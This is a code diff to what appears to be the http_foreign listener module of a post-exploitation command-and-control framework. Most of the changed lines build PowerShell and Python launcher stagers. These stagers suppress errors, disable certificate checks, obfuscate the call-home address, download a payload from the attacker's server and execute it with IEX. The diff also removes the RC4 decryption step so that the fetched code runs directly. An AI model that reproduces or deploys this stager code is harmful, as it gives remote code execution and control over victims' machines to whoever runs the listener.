@@ -63,8 +63,8 @@ class Listener:
             },
             "Cookie": {
                 "Description": "Custom Cookie Name",
-                "Required": False,
-                "Value": "",
+                "Required": True,
+                "Value": "session",
             },
             "RoutingPacket": {
                 "Description": "Routing packet from the targeted listener",
@@ -108,6 +108,7 @@ class Listener:
         self.thread = None
 
         # optional/specific for this module
+        self.host_address = None
         self.app = None
         self.uris = [
             a.strip("/")
@@ -119,13 +120,8 @@ class Listener:
             data_util.get_config("staging_key")[0]
         )
 
-        self.session_cookie = ""
+        self.session_cookie = self.options["Cookie"]["Value"]
         self.template_dir = self.mainMenu.installPath + "/data/listeners/templates/"
-
-        # check if the current session cookie not empty and then generate random cookie
-        if self.session_cookie == "":
-            self.options["Cookie"]["Value"] = listener_util.generate_cookie()
-
         self.instance_log = log
 
     def default_response(self):
@@ -145,6 +141,11 @@ class Listener:
             for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
         ]
 
+        self.host_address, err = self.mainMenu.listenersv2.validate_listener_address(
+            self.options
+        )
+        if err:
+            return False, err
         return True, None
 
     def generate_launcher(
@@ -172,21 +173,15 @@ class Listener:
             )
             return None
 
-        active_listener = self
-        # extract the set options for this instantiated listener
-        listenerOptions = active_listener.options
-
-        host = listenerOptions["Host"]["Value"]
-        launcher = listenerOptions["Launcher"]["Value"]
-        stagingKey = listenerOptions["StagingKey"]["Value"]
-        profile = listenerOptions["DefaultProfile"]["Value"]
+        launcher = self.options["Launcher"]["Value"]
+        stagingKey = self.options["StagingKey"]["Value"]
+        profile = self.options["DefaultProfile"]["Value"]
         uris = list(profile.split("|")[0].split(","))
         stage0 = random.choice(uris)
         customHeaders = profile.split("|")[2:]
+        cookie = self.options["Cookie"]["Value"]
 
-        if language.startswith("po"):
-            # PowerShell
-
+        if language == "powershell":
             stager = '$ErrorActionPreference = "SilentlyContinue";'
             if safe_checks.lower() == "true":
                 stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
@@ -198,11 +193,11 @@ class Listener:
             stager += "$wc=New-Object System.Net.WebClient;"
 
             if user_agent.lower() == "default":
-                profile = listenerOptions["DefaultProfile"]["Value"]
+                profile = self.options["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
             stager += f"$u='{user_agent}';"
 
-            if "https" in host:
+            if "https" in self.host_address:
                 # allow for self-signed certificates for https connections
                 stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
@@ -244,23 +239,17 @@ class Listener:
             # code to turn the key string into a byte array
             stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{stagingKey}');"
 
-            # this is the minimized RC4 stager code from rc4.ps1
-            stager += listener_util.powershell_rc4()
-
             # Use routingpacket from foreign listener
-            b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
+            b64RoutingPacket = self.options["RoutingPacket"]["Value"]
 
-            # add the RC4 packet to a cookie
-            stager += f'$wc.Headers.Add("Cookie","session={b64RoutingPacket}");'
+            # add the routing packet to a cookie
+            stager += f'$wc.Headers.Add("Cookie","{cookie}={b64RoutingPacket}");'
 
-            stager += (
-                f"$ser= {helpers.obfuscate_call_home_address(host)};$t='{stage0}';"
-            )
+            stager += f"$ser= {helpers.obfuscate_call_home_address(self.host_address)};$t='{stage0}';"
             stager += "$data=$wc.DownloadData($ser+$t);"
-            stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
 
             # decode everything and kick it over to IEX to kick off execution
-            stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+            stager += "IEX ([Text.Encoding]::UTF8.GetString($data))"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
@@ -282,7 +271,7 @@ class Listener:
 
         if language in ["python", "ironpython"]:
             launcherBase = "import sys;"
-            if "https" in host:
+            if "https" in self.host_address:
                 # monkey patch ssl woohooo
                 launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"
 
@@ -294,28 +283,28 @@ class Listener:
                 log.error(p, exc_info=True)
 
             if user_agent.lower() == "default":
-                profile = listenerOptions["DefaultProfile"]["Value"]
+                profile = self.options["DefaultProfile"]["Value"]
                 user_agent = profile.split("|")[1]
 
             launcherBase += dedent(
                 f"""
                 o=__import__({{2:'urllib2',3:'urllib.request'}}[sys.version_info[0]],fromlist=['build_opener']).build_opener();
                 UA='{user_agent}';
-                server='{host}';t='{stage0}';
+                server='{self.host_address}';t='{stage0}';
                 """
             )
 
-            b64RoutingPacket = listenerOptions["RoutingPacket"]["Value"]
+            b64RoutingPacket = self.options["RoutingPacket"]["Value"]
 
-            # add the RC4 packet to a cookie
-            launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "session={b64RoutingPacket}")];\n'
+            # add the routing packet to a cookie
+            launcherBase += f'o.addheaders=[(\'User-Agent\',UA), ("Cookie", "{cookie}={b64RoutingPacket}")];\n'
             launcherBase += "import urllib.request;\n"
 
             if proxy.lower() != "none":
                 if proxy.lower() == "default":
                     launcherBase += "proxy = urllib.request.ProxyHandler();\n"
                 else:
-                    proto = proxy.Split(":")[0]
+                    proto = proxy.split(":")[0]
                     launcherBase += (
                         "proxy = urllib.request.ProxyHandler({'"
                         + proto
@@ -348,7 +337,7 @@ class Listener:
 
             # install proxy and creds globally, so they can be used with urlopen.
             launcherBase += "urllib.request.install_opener(o);\n"
-            launcherBase += "a=o.open(server+t).read();\n"
+            launcherBase += "data=o.open(server+t).read();\n"
 
             # download the stager and extract the IV
             launcherBase += listener_util.python_extract_stager(stagingKey)
@@ -404,8 +393,6 @@ class Listener:
 
         This is so agents can easily be dynamically updated for the new listener.
         """
-        host = listenerOptions["Host"]["Value"]
-
         if not language:
             log.error("listeners/http_foreign generate_comms(): no language specified!")
             return None
@@ -421,7 +408,7 @@ class Listener:
 
             template_options = {
                 "session_cookie": self.session_cookie,
-                "host": host,
+                "host": self.host_address,
             }
 
             return template.render(template_options)
@@ -436,7 +423,7 @@ class Listener:
 
             template_options = {
                 "session_cookie": self.session_cookie,
-                "host": host,
+                "host": self.host_address,
             }
 
             return template.render(template_options)
